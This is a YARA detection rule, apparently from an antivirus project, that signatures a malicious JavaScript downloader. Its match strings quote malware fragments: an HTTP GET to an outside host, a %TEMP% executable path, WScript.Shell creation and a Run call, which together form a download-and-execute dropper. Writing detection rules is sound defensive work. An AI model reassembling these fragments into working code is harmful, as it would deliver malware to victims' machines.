rule sig_20160329_8607000a0bd88825fe07de5a6b7d7c72 {
  meta:
    description = "datamaliciousorder - file 20160329_8607000a0bd88825fe07de5a6b7d7c72.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7b4ff6b3c166c4ff615b0ce7612adf9847ce938f2abd2393d08cfa250a55ca12"

  strings:
    $s1  = "gH[yh](\"GET\", \"http://greenellebox.com/a1odk\", false);" fullword ascii
    $s2  = "function j() {return lR[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Bxejk2of4.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[YS](X() * 11); if (gH[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var lR = function E() {return WScript[TK](\"WScript.Shell\");}(), PJ = 11;" fullword ascii
    $s5  = "function G(T, mz){Jx = Jx * 1; return T - mz;};" fullword ascii
    $s6  = "function Me(){return \"\" + B;};" fullword ascii
    $s7  = "function ys() {return ((i0 == true) && (i0 == WI)) ? 1 : Jx;};" fullword ascii
    $s8  = "function aP(x){lR[\"Run\"](x, Jx, Jx);};" fullword ascii
    $s9  = "var l = new this[\"Date\"]();" fullword ascii
    $s10 = " while (N){" fullword ascii
    $s11 = "function X(){return 22;};" fullword ascii
    $s12 = "function kq()" fullword ascii
    $s13 = "function F(){return TK;};" fullword ascii
    $s14 = "return G(i, H);" fullword ascii
    $s15 = "function PI(Y) {var Y0 = (1, 2, 3, 4, 5, Y); return Y0;};" fullword ascii
    $s16 = "var WI = false;" fullword ascii
    $s17 = "WI = true; " fullword ascii
    $s18 = "var i0 = false;" fullword ascii
    $s19 = "var u = false;" fullword ascii
    $s20 = "i0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}